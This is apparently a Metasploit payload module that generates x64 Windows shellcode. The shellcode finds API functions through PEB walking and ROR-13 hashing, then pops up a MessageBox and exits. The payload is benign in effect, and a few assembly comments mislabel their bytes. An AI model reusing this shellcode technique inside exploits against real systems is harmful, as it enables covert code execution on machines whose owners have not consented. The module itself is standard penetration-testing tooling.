##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# vim :set ts=4 sw=4 sts=4 et :
module MetasploitModule

    CachedSize = 275

    include Msf::Payload::Windows
    include Msf::Payload::Single

    def initialize(info = {})
        super(merge_info(info,
            'Name'          => 'Windows MessageBox x64',
            'Description'   => 'Spawn a dialog via MessageBox using a customizable title, text & icon',
            'Author'        => [
                'pasta <jaguinaga[at]infobytesec.com>'
            ],
            'License'       => MSF_LICENSE,
            'Platform'      => 'win',
            'Arch'          => ARCH_X64,
            ))
        register_options([
                OptString.new('TITLE', [ true, "Messagebox Title", "MessageBox" ]),
                OptString.new('TEXT', [ true, "Messagebox Text", "Hello, from MSF!" ]),
                OptString.new('ICON', [ true, "Icon type can be NO, ERROR, INFORMATION, WARNING or QUESTION", "NO" ]),
            ])
    end

    def ror(x, n, bits=32)
        mask = (2**n) - 1
        mask_bits = x & mask
        return (x >> n) | (mask_bits << (bits - n))
    end

    def rol(x, n, bits = 32)
        return ror(x, bits - n, bits)
    end

    def hash(msg)
        hash = 0
        msg.each_byte {|c|
            hash = ror(c.ord + hash, 0xd)
            #puts "%c - %.8x" % [c, hash]
        }
        return hash
    end

    def to_unicode(msg)
        return msg.encode("binary").split('').join("\x00") + "\x00\x00"
    end

    # hash generator, it could be pushed to the parent object
    def api_hash(libname, function)
        return (hash(to_unicode(libname.upcase)) + hash(function)) & 0xffffffff
    end

    def generate
        style = 0x00
        case datastore['ICON'].upcase.strip
            #default = NO
        when 'ERROR'
            style = 0x10
        when 'QUESTION'
            style = 0x20
        when 'WARNING'
            style = 0x30
        when 'INFORMATION'
            style = 0x40
        end

        # exitfunc
        if datastore['EXITFUNC'].upcase.strip == 'PROCESS'
            exitfunc =  "\x48\x33\xC9"              # xor rcx,rcx
            ## mov r10d, 0x56a2b5f0 ; ExitProcess's hash
            exitfunc << "\x41\xBA" + [api_hash("kernel32.dll", "ExitProcess")].pack("<L")
            exitfunc << "\xFF\xD5"                  # call rbp
        elsif datastore['EXITFUNC'].upcase.strip == 'THREAD'
            exitfunc =  "\xBB\xE0\x1D\x2A\x0A"		# mov ebx,0xa2a1de0
            ## mov r10d,0x9dbd95a6 ; kernel32.GetVersion
            exitfunc << "\x41\xBA" + [api_hash("kernel32.dll", "GetVersion")].pack("<L")
            exitfunc << "\xFF\xD5"					# call rbp
            exitfunc << "\x48\x83\xC4\x28"			# add rsp,0x28
            exitfunc << "\x3C\x06"					# cmp al,0x6
            exitfunc << "\x7C\x0A"					# jl 
            exitfunc << "\x80\xFB\xE0"				# cmp bl,0xe0
            exitfunc << "\x75\x05"					# jne
            ## mov ebx,0x6f721347 ; ntdll.RtlExitUserThread
            exitfunc << "\xBB" + [api_hash("ntdll.dll", "RtlExitUserThread")].pack("<L")
            exitfunc << "\x6A\x00"					# push 0
            exitfunc << "\x59"						# pop rcx
            exitfunc << "\x41\x89\xDA"				# mov r10d,ebx
            exitfunc << "\xFF\xD5"					# call rbp
        end

        payload_data =  "\xFC"						# cld
        payload_data << "\x48\x83\xE4\xF0"			# and rsp,0xfffffffffffffff0
        payload_data << "\xE8\xC0\x00\x00\x00"		# call offset to start_main
        payload_data << "\x41\x51"					# push r9
        payload_data << "\x41\x50"					# push r8
        payload_data << "\x52"						# push rdx
        payload_data << "\x51"						# push rcx
        payload_data << "\x56"						# push rsi
        payload_data << "\x48\x31\xD2"				# xor rdx,rdx
        payload_data << "\x65\x48\x8B\x52\x60"		# mov rdx,qword ptr gs:[rdx+0x60]
        payload_data << "\x48\x8B\x52\x18"			# mov rdx,qword ptr ds:[rdx+0x18]
        payload_data << "\x48\x8B\x52\x20"			# mov rdx,qword ptr ds:[rdx+0x20]
        # next_module:
        payload_data << "\x48\x8B\x72\x50"			# mov rdx,qword ptr ds:[rdx+0x50]
        payload_data << "\x48\x0F\xB7\x4A\x4A"		# movzx rcx,word ptr ds:[rdx+0x4a]
        payload_data << "\x4D\x31\xC9"				# xor r9,r9
        # nextchar:
        payload_data << "\x48\x31\xC0"				# xor rax,rax
        payload_data << "\xAC"						# lodsb
        payload_data << "\x3C\x61"					# cmp al,0x61
        payload_data << "\x7C\x02"					# jl uppercase
        payload_data << "\x2C\x20"					# sub al,0x20
        # uppercase:
        payload_data << "\x41\xC1\xC9\x0D"			# ror r9d,0xd
        payload_data << "\x41\x01\xC1"				# add r9d,eax
        payload_data << "\xE2\xED"					# loop nextchar
        payload_data << "\x52"						# push rdx
        payload_data << "\x41\x51"					# push r9
        payload_data << "\x48\x8B\x52\x20"			# mov rdx,qword ptr ds:[rdx+0x20]
        payload_data << "\x8B\x42\x3C"				# mov eax,dword ptr ds:[rdx+0x3c]
        payload_data << "\x48\x01\xD0"              # add rax,rdx
        payload_data << "\x8B\x80\x88\x00\x00\x00"  # mov eax,dword ptr ds:[rax+0x88]
        payload_data << "\x48\x85\xC0"				# test rax,rax
        payload_data << "\x74\x67"					# je next_module
        payload_data << "\x48\x01\xD0"				# add rax,rdx
        payload_data << "\x50"						# push rax
        payload_data << "\x8B\x48\x18"				# mov ecx,dword ptr ds:[rax+0x18]
        payload_data << "\x44\x8B\x40\x20"			# mov r8d,dword ptr ds:[rax+0x20]
        payload_data << "\x49\x01\xD0"				# add r8,rdx
        payload_data << "\xE3\x56"					# jrcxz nexmodule+1
        payload_data << "\x48\xFF\xC9"				# dec rcx
        payload_data << "\x41\x8B\x34\x88"			# mov esi,dword ptr ds:[r8+rcx*4]
        payload_data << "\x48\x01\xD6"				# add rsi,rdx
        payload_data << "\x4D\x31\xC9"				# xor r9,r9
        # find_function:
        payload_data << "\x48\x31\xC0"				# xor rax,rax
        payload_data << "\xAC"						# lodsb
        payload_data << "\x41\xC1\xC9\x0D"			# ror r9d,0xd
        payload_data << "\x41\x01\xC1"				# add r9d,eax
        payload_data << "\x38\xE0"					# cmp al,ah
        payload_data << "\x75\xF1"					# jne find_function
        payload_data << "\x4C\x03\x4C\x24\x08"		# add r9,qword ptr ss:[rsp+0x8]
        payload_data << "\x45\x39\xD1"				# cmp r9d,r10d
        payload_data << "\x75\xD8"					# jne 
        payload_data << "\x58"						# pop rax
        payload_data << "\x44\x8B\x40\x24"			# mov r8d,dword ptr ds:[rax+0x24]
        payload_data << "\x49\x01\xD0"				# add r8,rdx
        payload_data << "\x66\x41\x8B\x0C\x48"		# mov cx,word ptr ds:[r8+rcx*2]
        payload_data << "\x44\x8B\x40\x1C"			# mov r8d,dword ptr ds:[rax+0x1c]
        payload_data << "\x49\x01\xD0"				# add r8,rdx
        payload_data << "\x41\x8B\x04\x88"			# mov rax,dword ptr ds:[r8+rcx*4]
        payload_data << "\x48\x01\xD0"				# add r8,rdx
        payload_data << "\x41\x58"					# pop r8
        payload_data << "\x41\x58"					# pop r8
        payload_data << "\x5E"						# pop rsi
        payload_data << "\x59"						# pop rcx
        payload_data << "\x5A"						# pop rdx
        payload_data << "\x41\x58"					# pop r8
        payload_data << "\x41\x59"					# pop r9
        payload_data << "\x41\x5A"					# pop r10
        payload_data << "\x48\x83\xEC\x20"			# sub rsp,0x20
        payload_data << "\x41\x52"					# push r10
        payload_data << "\xFF\xE0"					# jmp rax
        payload_data << "\x58"						# pop rax
        payload_data << "\x41\x59"					# pop r9
        payload_data << "\x5A"						# pop rdx
        payload_data << "\x48\x8B\x12"				# mov rdx,qword ptr ds:[rdx]
        payload_data << "\xE9\x57\xFF\xFF\xFF"		# jmp 
        # start_main:
        payload_data << "\x5D"						# pop rbp
        payload_data << "\x41\xB9" + [style].pack("<L")	# push style
        ## lea rdx,qword ptr ss:[rbp+offsetTEXT]
        payload_data << "\x48\x8D\x95" + [0xe0 + exitfunc.length].pack("<L")
        ## lea r8,qword ptr ss:[rbp+offsetTITLE]
        payload_data << "\x4C\x8D\x85" + [0xe1 + exitfunc.length + datastore['TEXT'].length].pack("<L")	
        payload_data << "\x48\x33\xC9"				# xor rcx,rcx
        ## mov r10d,0x07568345 ; MessageBoxA's hash
        payload_data << "\x41\xBA" + [api_hash("user32.dll", "MessageBoxA")].pack("<L")			
        payload_data << "\xFF\xD5"					# call rbp

        payload_data << exitfunc
        payload_data << datastore['TEXT'] + "\x00"
        payload_data << datastore['TITLE'] + "\x00"
	
        return payload_data

    end
end
